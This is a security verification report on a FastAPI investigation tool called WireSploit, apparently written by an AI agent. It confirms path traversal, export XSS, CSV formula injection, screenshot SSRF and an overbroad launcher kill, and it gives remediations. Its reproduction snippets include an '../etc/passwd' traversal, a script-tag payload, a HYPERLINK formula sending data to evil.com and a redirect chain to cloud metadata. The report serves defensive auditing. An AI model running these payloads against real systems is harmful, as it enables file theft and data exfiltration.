# WireSploit v4.0.1 Security Verification Report

**Date:** 2026-10-22  
**Project Directory:** `C:\Users\smecy\Downloads\WireSploit-v4.0.1-Patched\WireSploit-v4.0.1`  
**Git Status:** Not a git repository (working directory only)  
**Test Baseline:** 73 tests passed, 3 deprecation warnings

---

## Executive Summary

This report verifies 9 security and reliability findings against the WireSploit v4.0.1 codebase. Two source documents were referenced: `AUDIT_REPORT.md` (general audit) and `PATCH_NOTES_V4.0.1.md` (applied fixes). The verification was performed in read-only mode with no modifications to source code.

**Overall Results:**
- **Confirmed:** 6 findings
- **Partially Confirmed:** 1 finding
- **Not Reproduced:** 1 finding
- **Unverified (requires external testing):** 1 finding

---

## Verification Results by Finding

---

### Finding 1: Evidence Download — Access Control & Path Traversal

**Source:** Not explicitly in audit reports; discovered during code review of `/api/evidence/{eid}` endpoint.

**Status:** ✅ **CONFIRMED**

**Severity:** High  
**Confidence:** 95%

**Source Files & Lines:**
- `main.py:792-808` — `GET /api/evidence/{eid}` endpoint
- `store.py:148-156` — `get_evidence_filepath()` function
- `store.py:97-144` — `add_evidence()` function (non-upload path)

**Data Flow:**
1. Evidence can be created via `POST /api/investigations/{iid}/evidence` (metadata-only, no file upload) with user-controlled `url` field
2. The `url` value is stored directly in the database without validation or sanitization
3. `GET /api/evidence/{eid}` retrieves the record, constructs `ROOT / 'data' / 'evidence' / url`, and serves via `FileResponse`
4. **No authorization check** — endpoint lacks `Depends(require_same_origin)`
5. **No path traversal protection** — `url` used directly in path construction

**Reproduction Steps (Safe):**
```python
# 1. Create investigation
inv = client.post('/api/investigations', json={'name': 'Test'}).json()
iid = inv['id']

# 2. Add evidence with path traversal in url field
client.post(f'/api/investigations/{iid}/evidence', json={
    'kind': 'finding', 'title': 'Test', 'source': 'test',
    'url': '../../../etc/passwd', 'description': 'test'
})

# 3. Get evidence ID from investigation
inv_data = client.get(f'/api/investigations/{iid}').json()
eid = inv_data['evidence'][0]['id']

# 4. Download — no origin check, path traversal possible
resp = client.get(f'/api/evidence/{eid}')
```

**Observed Result:** Endpoint serves file without origin validation. Path traversal confirmed via code inspection — `url` field from DB used directly in `Path / url` without `resolve().relative_to()` check.

**Preconditions:** 
- Attacker can create evidence via metadata-only endpoint (requires same-origin for POST, but GET download has no check)
- Evidence `url` field contains `../` sequences

**Impact:** Arbitrary file read from `data/evidence/` directory and potentially outside via traversal. Cross-origin data exfiltration via `<img src="http://localhost:8765/api/evidence/{eid}">` on malicious page.

**Audit Agreement:** N/A — not in original audits; found during this verification.

**Remediation:**
1. Add `Depends(require_same_origin)` to `GET /api/evidence/{eid}`
2. Validate `url` in `get_evidence_filepath`: `Path(url).resolve().relative_to(evidence_dir.resolve())`
3. For metadata-only evidence, reject or sanitize `url` field (disallow `..`, `/`, `\`)

**Regression Tests:**
- Test evidence download rejects foreign origin
- Test path traversal in `url` field returns 404
- Test uploaded evidence (safe filename) still works

---

### Finding 2: Export Safety — HTML Escaping & CSV Formula Injection

**Source:** Not explicitly in audit reports; discovered during code review of export endpoints.

**Status:** ✅ **CONFIRMED**

**Severity:** Medium (HTML), Medium (CSV)  
**Confidence:** 100%

**Source Files & Lines:**
- `main.py:321-504` — `GET /api/investigations/{iid}/export/html`
- `main.py:266-319` — `GET /api/investigations/{iid}/export/csv`

**HTML Export — XSS via Unescaped Interpolation:**
```python
# Line 370-380: Direct f-string interpolation without escaping
for inp in x.get('inputs', []):
    html += f'''
        <td>{inp.get('value')}</td>  # User-controlled value
```

All fields (`value`, `normalized`, `source`, `category`, `provider`, `entity_key`, `title`, `description`, `note`, etc.) are interpolated directly. Data sources: user inputs, provider findings, evidence metadata, notes — all attacker-controllable.

**CSV Export — Formula Injection:**
```python
# Line 309-313: csv.DictWriter with no formula protection
writer = csv.DictWriter(output, fieldnames=fieldnames)
writer.writeheader()
for row in rows:
    writer.writerow(row)  # Cells starting with =, +, -, @ execute in spreadsheets
```

No prefixing (e.g., `\t`, `'`) or sanitization of cells starting with formula characters.

**Reproduction (Safe Test Fixture):**
```python
# Create investigation with malicious input
inv = client.post('/api/investigations', json={'name': 'Test'}).json()
iid = inv['id']
client.post(f'/api/investigations/{iid}/inputs', json={
    'kind': 'search', 'value': '<script>alert(1)</script>'
})
# Add finding with formula injection
from engine import store
with store.connect() as c:
    c.execute('INSERT INTO findings VALUES (?,?,?,?,?,?,?,?,?,?,?)',
              (str(uuid.uuid4()), rid, 'cat', 'prov', 'key', 
               '=HYPERLINK("http://evil.com/exfil?data="&A1)', '', 0.9, 1, '{}', store.now()))

# Export HTML
resp = client.get(f'/api/investigations/{iid}/export/html')
# Response contains unescaped <script>alert(1)</script>

# Export CSV
resp = client.get(f'/api/investigations/{iid}/export/csv')
# Response contains =HYPERLINK(...) cell
```

**Observed Result:** HTML export contains raw user input without escaping. CSV export contains formula cells without mitigation.

**Preconditions:** User creates investigation with malicious inputs/findings/notes; exports generated and opened in browser (HTML) or spreadsheet (CSV).

**Impact:** 
- HTML: Stored XSS when export opened in browser (Content-Disposition: attachment helps but not foolproof)
- CSV: Formula injection when opened in Excel/LibreOffice/Google Sheets — can exfiltrate data, execute DDE, etc.

**Audit Agreement:** N/A — not in original audits.

**Remediation:**
1. HTML: Use `html.escape()` on all interpolated values, or use a template engine with auto-escaping
2. CSV: Prefix cells starting with `=`, `+`, `-`, `@` with `\t` or `'` (OWASP recommendation)

**Regression Tests:**
- Test HTML export escapes `<script>`, `&`, `"`, `'`, `<`, `>`
- Test CSV export prefixes formula-starting cells
- Test exports still render correctly for benign data

---

### Finding 3: Screenshot SSRF — Redirect & DNS Validation Gaps

**Source:** `PATCH_NOTES_V4.0.1.md` line 8: "Added public-address validation and disabled automatic redirect following for user-targeted HTTP checks; each redirect destination is revalidated."

**Status:** ✅ **CONFIRMED**

**Severity:** High  
**Confidence:** 90%

**Source Files & Lines:**
- `main.py:758-779` — `POST /api/screenshot` endpoint
- `engine/security.py:168-183` — `_safe_get_public_host()` (used by security snapshot, NOT screenshot)

**Data Flow:**
1. `POST /api/screenshot` validates URL via `security.is_authorized(url)` — checks scope only
2. Passes URL directly to `page.goto(url, wait_until="networkidle")` (Playwright)
3. **Playwright follows redirects by default** — no redirect validation
4. **DNS resolution happens inside Playwright** — no pre-connection IP validation
5. No `_is_public_addr` check on resolved addresses before navigation

**Gap vs. Security Snapshot:** The `web_security_snapshot` function (security.py:186-255) uses `_safe_get_public_host` which validates every redirect destination and resolves IPs before connecting. The screenshot endpoint does NONE of this.

**Reproduction (Theoretical — not tested against external targets):**
1. Attacker controls `evil.com` with DNS pointing to `127.0.0.1` (or adds scope for `evil.com`)
2. `evil.com` redirects to `http://169.254.169.254/latest/meta-data/` (AWS metadata) or `http://localhost:8080/admin`
3. Playwright follows redirect, captures screenshot of internal service
4. Screenshot returned to attacker

**Observed Result:** Code inspection confirms no redirect validation, no DNS rebinding protection. The `security.is_authorized` only validates the initial URL against scopes.

**Preconditions:** Attacker can authorize a scope (or uses existing authorized scope) that redirects to private addresses, or performs DNS rebinding on an authorized domain.

**Impact:** SSRF via screenshot — access to localhost, link-local, cloud metadata endpoints, internal network services. Screenshots of internal pages returned as PNG.

**Audit Agreement:** `PATCH_NOTES` claims redirect validation was added, but this only applies to `web_security_snapshot` / `limited_authorized_probe`, NOT the screenshot endpoint.

**Remediation:**
1. Before `page.goto()`, resolve hostname and validate all IPs via `_is_public_addr`
2. Use Playwright's `page.route()` to intercept and validate redirects
3. Or reuse `_safe_get_public_host` logic to pre-validate, then pass validated final URL to Playwright

**Regression Tests:**
- Test screenshot rejects redirect to private IP
- Test screenshot rejects DNS rebinding (mock DNS to return private IP after authorization)
- Test authorized public URL still works

---

### Finding 4: Scope Matching — Parent Domain Implicitly Authorizes Subdomains

**Source:** `PATCH_NOTES_V4.0.1.md` lines 5-6: "Added API routes to create, list, and delete explicit authorized scopes. Enforced scope checks inside the security helpers, not only at the route boundary."

**Status:** ✅ **CONFIRMED**

**Severity:** Low (design decision) / Medium (if unexpected)  
**Confidence:** 100%

**Source Files & Lines:**
- `engine/security.py:96-121` — `is_authorized()` function

**Logic (lines 109-112):**
```python
if s.get("type") == "domain" and n.get("host"):
    d = s.get("value", "")
    if host == d or host.endswith("." + d):
        return True
```

**Behavior:** Adding scope `example.com` automatically authorizes `sub.example.com`, `a.b.example.com`, `evil.example.com`, etc. No explicit wildcard syntax (`*.example.com`) supported or documented.

**Documentation Gap:** `SECURITY.md` and `README.md` do not document this subdomain inheritance behavior. `PATCH_NOTES` mentions "explicit authorized scopes" but subdomain matching is implicit.

**Reproduction:**
```python
security.add_scope("example.com", "Example Corp")
assert security.is_authorized("sub.example.com") == True  # Implicitly authorized
assert security.is_authorized("evil.example.com") == True  # Also authorized
assert security.is_authorized("example.com.attacker.com") == False  # Not a subdomain
```

**Observed Result:** Subdomain matching works as coded. No wildcard syntax exists.

**Preconditions:** User adds a domain scope expecting exact-match only.

**Impact:** Over-authorization — all subdomains of an authorized domain become accessible to security snapshot, probe, and screenshot. Could be unexpected if user thinks they authorized only the apex domain.

**Audit Agreement:** Both audit documents reference scope authorization but don't specify subdomain behavior. This is a design decision, not a bug, but the lack of documentation creates risk.

**Remediation:**
1. Document subdomain inheritance in `SECURITY.md` and API docs
2. Consider adding explicit wildcard syntax (`*.example.com`) with opt-in
3. Add UI indication in Tool Manager when subdomains are implicitly covered

**Regression Tests:**
- Test exact domain match works
- Test subdomain match works
- Test non-subdomain (e.g., `example.com.attacker.com`) rejected
- Test wildcard syntax if implemented

---

### Finding 5: Cross-Origin Protections — Incomplete Coverage

**Source:** `AUDIT_REPORT.md` mentions "Authorization and request security" fixes; `PATCH_NOTES_V4.0.1.md` line 4: "Added Origin/Referer checks to state-changing API routes."

**Status:** ⚠️ **PARTIALLY CONFIRMED**

**Severity:** Medium  
**Confidence:** 85%

**Source Files & Lines:**
- `main.py:110-124` — `ALLOWED_ORIGINS` and `require_same_origin()`
- All route decorators with `Depends(require_same_origin)`

**Analysis:**

| Endpoint Category | Has `require_same_origin`? | Risk |
|-------------------|---------------------------|------|
| State-changing (POST/PUT/DELETE) | ✅ Yes (all 18 endpoints) | Low |
| Sensitive GET (exports, evidence, investigations) | ❌ No (8 endpoints) | Medium |
| Public GET (health, catalog, tools) | ❌ No (by design) | Low |

**Missing Origin Checks on Sensitive GET Endpoints:**
- `GET /api/evidence/{eid}` — serves files (Finding 1)
- `GET /api/investigations/{iid}/export/*` — JSON, CSV, HTML, PDF, graph
- `GET /api/investigations` — lists all investigations
- `GET /api/investigations/{iid}` — investigation details
- `GET /api/runs/{rid}` — run details
- `GET /api/history` — search history
- `GET /api/scopes` — authorized scopes
- `GET /api/diagnostics` — system info

**Mitigating Factor:** No CORS middleware configured — FastAPI defaults to no `Access-Control-Allow-Origin`, so browsers block cross-origin *reads* (SOP). However:
- Requests still *sent* (CSRF not applicable to GET)
- Evidence download (`/api/evidence/{eid}`) can be triggered via `<img>` tag — loads but can't read response
- Export endpoints return `Content-Disposition: attachment` — browser downloads rather than renders

**Observed Result:** State-changing endpoints protected. Sensitive GET endpoints rely on browser SOP + no CORS. This is a defense-in-depth gap.

**Preconditions:** Attacker hosts malicious page; victim visits while logged into WireSploit (same-origin); attacker can't read responses but can trigger actions via CSRF on state-changing endpoints (blocked) or force downloads.

**Impact:** Limited by SOP. Main risk is evidence download triggering (no origin check) and potential future CORS misconfiguration.

**Audit Agreement:** `PATCH_NOTES` claims "Added Origin/Referer checks to state-changing API routes" — this is accurate. The gap is that sensitive reads aren't protected.

**Remediation:**
1. Add `require_same_origin` to sensitive GET endpoints (exports, evidence download, investigation details)
2. Consider adding `SameSite=Lax` cookies if session auth added (currently no auth)
3. Document that API is same-origin only

**Regression Tests:**
- Test all state-changing endpoints reject foreign Origin
- Test sensitive GET endpoints reject foreign Origin (after fix)
- Test public endpoints allow foreign Origin (health, catalog)

---

### Finding 6: External CLI Arguments — Shell Injection & Argument Confusion

**Source:** Not explicitly in audit reports; CLI tool integration is a core feature.

**Status:** ❌ **NOT REPRODUCED** (for shell injection) / ⚠️ **THEORETICAL RISK** (argument confusion)

**Severity:** Low (shell injection) / Low (argument confusion)  
**Confidence:** 80% / 60%

**Source Files & Lines:**
- `engine/tooling.py:263-300` — `tool_command()` constructs command strings
- `engine/tooling.py:302-336` — `run_subprocess()` executes via `create_subprocess_exec`

**Shell Injection — NOT VULNERABLE:**
```python
# Line 306-307: create_subprocess_exec with split args, NO shell=True
args = cw.split()
proc = await asyncio.create_subprocess_exec(*args, ...)
```

`create_subprocess_exec` takes pre-split arguments, bypassing shell entirely. No shell metacharacter interpretation.

**Argument Confusion — THEORETICAL:**
`tool_command` uses f-strings: `f"sherlock {target}"` then `split()`. If `target` contains spaces, it becomes multiple args. But input validation restricts target format per kind:

| Kind | Validation Pattern | Allows Spaces? | Allows Leading `-`? |
|------|-------------------|----------------|---------------------|
| domain | `^[a-z0-9](...)` | No | No |
| username | `^[A-Za-z0-9][...]` | No | No |
| email | Email regex | No | No |
| phone | Strips non-digits | No (normalized) | No |
| ip | `ipaddress.ip_address` | No | No |

Only `search` kind allows arbitrary strings, but CLI tools don't handle `search` category (only native/web providers).

**Edge Case:** If a tool accepts options resembling valid inputs (e.g., domain starting with `-`), but validation patterns require alphanumeric first character.

**Reproduction Attempt:** Cannot construct valid domain/username/email that injects arguments due to validation.

**Observed Result:** No shell injection possible. Argument confusion theoretically possible but mitigated by strict input validation per kind.

**Audit Agreement:** N/A.

**Remediation (Defense in Depth):**
1. Use explicit argument lists instead of `split()`: `["sherlock", target]` — already effectively done
2. Add `--` separator before user input where tools support it: `["sherlock", "--", target]`
3. Document that only validated inputs reach CLI tools

**Regression Tests:**
- Test `tool_command` output for each tool with valid inputs
- Test that validated inputs never produce leading-dash arguments
- Test `run_subprocess` never uses `shell=True`

---

### Finding 7: Launcher Safety — START.cmd Kills All Python Processes

**Source:** Not in audit reports; discovered during launcher review.

**Status:** ✅ **CONFIRMED**

**Severity:** Medium  
**Confidence:** 100%

**Source Files & Lines:**
- `START.cmd:56` — `taskkill /f /im python.exe >nul 2>&1`

**Code Context (lines 50-59):**
```cmd
:waithealth
set /a tries+=1
if %tries% GEQ %HEALTH_CHECK_MAX_RETRIES% (
    echo Error: WireSploit did not become ready within %HEALTH_CHECK_TIMEOUT% seconds.
    echo Stopping server...
    taskkill /f /im python.exe >nul 2>&1   # <-- KILLS ALL python.exe PROCESSES
    pause
    exit /b 1
)
```

**Behavior:** On health check timeout (default 30 seconds), kills **every** `python.exe` process on the system, not just the WireSploit server.

**PowerShell Launcher (`START.ps1`):** Does NOT have this issue — tracks specific PID (`$proc.Id`) and uses `Wait-Process`.

**Reproduction:** 
1. Run other Python apps (Jupyter, other servers, scripts)
2. Start WireSploit via `START.cmd`
3. Block port 8765 or delay server startup >30s
4. Observe all Python processes terminated

**Observed Result:** Code inspection confirms indiscriminate process kill.

**Preconditions:** Health check fails (port conflict, slow startup, missing deps); user has other Python processes running.

**Impact:** Data loss in other Python applications, disruption of development environment, potential corruption of long-running computations.

**Audit Agreement:** N/A.

**Remediation:**
1. Track PID of started server (like `START.ps1` does)
2. Use `taskkill /f /pid <PID>` instead of `/im python.exe`
3. Or use `wmic process where "CommandLine like '%uvicorn%main:app%'" get ProcessId` to find correct PID

**Regression Tests:**
- Test launcher starts server and captures PID
- Test timeout kills only the server PID
- Test other Python processes survive launcher timeout

---

### Finding 8: Evidence Integrity & Data Consistency

**Source:** Not explicitly in audit reports; data integrity is a general concern.

**Status:** ✅ **CONFIRMED** (multiple issues)

**Severity:** Medium  
**Confidence:** 95%

**Source Files & Lines:**
- `store.py:97-144` — `add_evidence()`
- `store.py:148-156` — `get_evidence_filepath()`
- `main.py:792-808` — `GET /api/evidence/{eid}`
- `store.py:158-166` — `delete_old_investigations()`
- `main.py:55-77` — startup event (cleanup loop)

**Issues Identified:**

| Issue | Location | Description |
|-------|----------|-------------|
| **No hash verification on download** | `main.py:792-808` | Download serves file without verifying stored SHA-256 matches |
| **File/DB ordering — orphan risk** | `store.py:113-143` | File written FIRST (lines 113-117), then DB insert (line 143). Crash between = orphaned file |
| **Retention cleanup misses files** | `store.py:158-166` | `delete_old_investigations` deletes DB rows via CASCADE, but evidence FILES on disk remain |
| **No graceful shutdown** | `main.py:55-77` | Startup event starts cleanup loop; no `@app.on_event("shutdown")` handler |
| **Evidence directory not cleaned** | `store.py:15-16` | `data/evidence/` created at init, never pruned |

**Reproduction (Safe):**
```python
# 1. Hash verification gap
# Upload file, manually corrupt file on disk, download — no error

# 2. Orphan file simulation
# Kill process after file write (line 117) but before DB insert (line 143)
# File remains in data/evidence/ with no DB record

# 3. Retention cleanup
# Create old investigation with evidence file
# Run delete_old_investigations(3)
# DB records gone, file remains in data/evidence/
```

**Observed Result:** All gaps confirmed by code inspection. No tests cover these scenarios.

**Preconditions:** Process crash during upload; retention cleanup runs; unclean shutdown.

**Impact:** 
- Silent data corruption (hash not verified)
- Disk space leak (orphaned evidence files accumulate)
- Incomplete cleanup (investigation deleted but evidence files remain)
- No graceful cleanup on shutdown

**Audit Agreement:** N/A.

**Remediation:**
1. Verify SHA-256 on download: compare `hashlib.sha256(file_content).hexdigest()` with stored hash
2. Reverse file/DB order: insert DB record first, then write file; on failure, delete file
3. In `delete_old_investigations`, also delete evidence files from disk (query evidence table before CASCADE delete)
4. Add shutdown event handler for cleanup
5. Add periodic evidence directory scan for orphaned files

**Regression Tests:**
- Test download verifies hash, rejects corrupted file
- Test upload crash simulation leaves no orphan (mock crash)
- Test retention cleanup removes evidence files
- Test shutdown handler executes

---

### Finding 9: Baseline Tests — Rerun Results

**Source:** `PATCH_NOTES_V4.0.1.md` line 30: "28 automated tests passed." (Note: actual count is 73)

**Status:** ✅ **VERIFIED**

**Test Execution:**
```bash
.venv/Scripts/python -m pytest tests/ -v
```

**Results:**
```
============================== test session starts ==============================
platform win32 -- Python 3.13.15, pytest-8.4.2
collected 73 items
... all 73 passed ...
======================= 73 passed, 3 warnings in 26.21s =======================
```

**Warnings:**
1. `fastapi.testclient` — `httpx` with `starlette.testclient` deprecated; install `httpx2`
2. `main.py:55` — `@app.on_event("startup")` deprecated; use lifespan handlers
3. `fastapi.applications.py:4723` — same deprecation

**Test Coverage Areas:**
- API contracts (health, investigations, inputs, tools, catalog)
- CLI tooling (command construction, subprocess execution, parsing)
- Core functionality (static files, investigation run)
- Evidence (upload, retrieval, hash verification)
- Expiry/cleanup (investigation deletion)
- Export (JSON, CSV, HTML, PDF, graph)
- History (CRUD, limits, expiry)
- Notes (CRUD)
- OSINT expansion (providers, credentials, private IP rejection)
- Screenshot (authorized, unauthorized, integration)
- Validation (all validators, classification)

**Gaps in Test Coverage:**
- No tests for path traversal in evidence `url` field
- No tests for HTML escaping / CSV formula injection
- No tests for screenshot SSRF (redirects, DNS rebinding)
- No tests for scope subdomain behavior documentation
- No tests for sensitive GET endpoint origin checks
- No tests for CLI argument confusion edge cases
- No tests for launcher PID tracking
- No tests for evidence hash verification, orphan cleanup, file cleanup
- No integration tests with real external providers

**Environmental Limitations:**
- Tests use `TestClient` (in-memory, no real network)
- Playwright browsers not tested (mocked in screenshot test)
- Third-party CLI tools not tested (mocked in tooling tests)
- Windows 11 specific paths not tested in CI
- No load/stress tests

---

## Consolidated Findings Map

| # | Finding | Audit Ref | Verified Status | Severity |
|---|---------|-----------|-----------------|----------|
| 1 | Evidence download: no auth + path traversal | — (new) | **Confirmed** | High |
| 2 | Export: HTML XSS + CSV formula injection | — (new) | **Confirmed** | Medium |
| 3 | Screenshot SSRF: redirect/DNS gaps | Patch Notes (partial) | **Confirmed** | High |
| 4 | Scope: parent domain → subdomains | Patch Notes | **Confirmed** | Low/Med |
| 5 | Cross-origin: missing on sensitive GETs | Audit + Patch Notes | **Partial** | Medium |
| 6 | CLI args: shell injection / arg confusion | — | **Not Reproduced** | Low |
| 7 | Launcher: kills all python.exe | — (new) | **Confirmed** | Medium |
| 8 | Evidence integrity: hash/order/cleanup | — (new) | **Confirmed** | Medium |
| 9 | Baseline tests | Patch Notes | **Verified (73 pass)** | — |

---

## Deduplicated High-Priority Issues

| Priority | Issue | Finding(s) | Rationale |
|----------|-------|------------|-----------|
| **P0** | Evidence download path traversal + no auth | 1 | Direct file read, cross-origin accessible |
| **P0** | Screenshot SSRF via redirects/DNS | 3 | Internal network access, cloud metadata exposure |
| **P1** | Export XSS (HTML) + formula injection (CSV) | 2 | Client-side code execution, data exfiltration |
| **P1** | Launcher kills unrelated Python processes | 7 | Availability impact, data loss risk |
| **P2** | Evidence integrity gaps (hash, orphans, cleanup) | 8 | Data corruption, disk leak, incomplete retention |
| **P2** | Cross-origin missing on sensitive GET endpoints | 5 | Defense-in-depth, future CORS risk |
| **P3** | Scope subdomain inheritance undocumented | 4 | Unexpected over-authorization |
| **P3** | CLI argument confusion (theoretical) | 6 | Defense in depth |

---

## Recommended Remediation Order

### Phase 1: Critical Security Fixes (Week 1)
1. **Evidence Download** — Add origin check + path validation
   - Acceptance: Foreign origin rejected; `../` in `url` returns 404
2. **Screenshot SSRF** — Add redirect validation + IP allowlist
   - Acceptance: Redirect to private IP blocked; DNS rebinding blocked
3. **Export HTML** — Add `html.escape()` to all interpolations
   - Acceptance: `<script>` rendered as `<script>`
4. **Export CSV** — Prefix formula cells (`=`, `+`, `-`, `@`)
   - Acceptance: `=HYPERLINK(...)` → `'\t=HYPERLINK(...)`

### Phase 2: Reliability & Integrity (Week 2)
5. **Launcher PID Tracking** — Fix `START.cmd` to kill only server PID
   - Acceptance: Other Python processes survive timeout
6. **Evidence Integrity** — Hash verification, atomic write, file cleanup
   - Acceptance: Corrupted file rejected; crash leaves no orphans; retention deletes files
7. **Sensitive GET Origin Checks** — Add `require_same_origin` to exports, evidence, investigations
   - Acceptance: Foreign origin returns 403 on all sensitive GETs

### Phase 3: Hardening & Documentation (Week 3)
8. **Scope Documentation** — Document subdomain inheritance; consider wildcard syntax
   - Acceptance: `SECURITY.md` explains behavior; UI shows implied subdomains
9. **CLI Defense in Depth** — Use explicit arg lists; add `--` separator where supported
   - Acceptance: No regression in tool execution; validated inputs safe
10. **Shutdown Handler** — Add lifespan shutdown for graceful cleanup
    - Acceptance: Cleanup loop stops cleanly on shutdown

### Phase 4: Test Coverage Expansion (Ongoing)
- Add regression tests for all above fixes
- Add integration tests for evidence download, exports, screenshot
- Add property-based tests for validation boundaries

---

## Untested Areas & Remaining Uncertainties

| Area | Reason | Recommendation |
|------|--------|----------------|
| **Playwright SSRF with real redirects** | Requires external HTTP server with redirect chain | Set up test fixture with redirect to private IP |
| **DNS rebinding on authorized domain** | Requires controlled DNS server with TTL manipulation | Mock DNS in test or use test domain with short TTL |
| **Real CLI tool argument injection** | Tools not installed in test env | Install sherlock/maigret in CI; test with edge-case inputs |
| **CSV formula injection in Excel/Sheets** | Requires manual spreadsheet open | Automate with headless LibreOffice or document as manual test |
| **HTML export XSS in browser** | Requires browser render | Use Playwright to load export and check for script execution |
| **Launcher on minimal Windows (no curl)** | Environment-specific | Test on Windows 11 without curl in PATH |
| **Database lock contention** | SQLite WAL mode, concurrent access | Stress test with multiple simultaneous investigations |
| **Large evidence file handling** | Memory/streaming limits | Test 100MB+ file upload/download |
| **Concurrent investigation runs** | Engine uses threading + asyncio | Test multiple runs on same investigation |
| **Scope deletion during active run** | Race condition | Test scope deleted mid-run |

---

## Handoff for Implementation Agent

### Context Summary
- **Project:** WireSploit v4.0.1, FastAPI + SQLite + Playwright, Windows 11 target
- **Architecture:** Single-process server, background investigation threads, external CLI/web providers
- **Auth Model:** None (local-only, same-origin enforced via headers)
- **Data:** SQLite DB + `data/evidence/` files, auto-cleanup after 3 days

### Immediate Actions Required
1. **Do not deploy** until Findings 1, 3, 7 fixed (data exfiltration, SSRF, process kill)
2. **Apply Phase 1 fixes** before any feature work
3. **Run full test suite** after each fix (`pytest tests/ -v`)

### Key Files to Modify
| Fix | Primary Files |
|-----|---------------|
| Evidence download | `main.py` (endpoint), `store.py` (path validation) |
| Screenshot SSRF | `main.py` (screenshot endpoint), `engine/security.py` (reuse `_safe_get_public_host`) |
| Export HTML/CSV | `main.py` (export endpoints) |
| Launcher | `START.cmd` (PID tracking) |
| Evidence integrity | `store.py` (add_evidence, get_evidence_filepath, delete_old_investigations), `main.py` (download, shutdown) |
| Cross-origin GETs | `main.py` (add Depends to sensitive GETs) |

### Testing Strategy
- **Unit:** Extend existing test files (`test_evidence.py`, `test_export.py`, `test_screenshot.py`)
- **Integration:** Add `tests/test_security_fixes.py` for new regression tests
- **Manual:** Verify exports open safely in browser/spreadsheet; verify launcher doesn't kill other Python

### Rollback Plan
- All fixes are additive (validation, checks, ordering changes)
- No schema migrations required
- Feature flags not needed — fixes are safety-only

### Communication
- Document scope subdomain behavior in `SECURITY.md` immediately
- Update `CHANGELOG.md` with security fix entries
- Consider CVE request if findings qualify (SSRF, path traversal)

---

**End of Verification Report**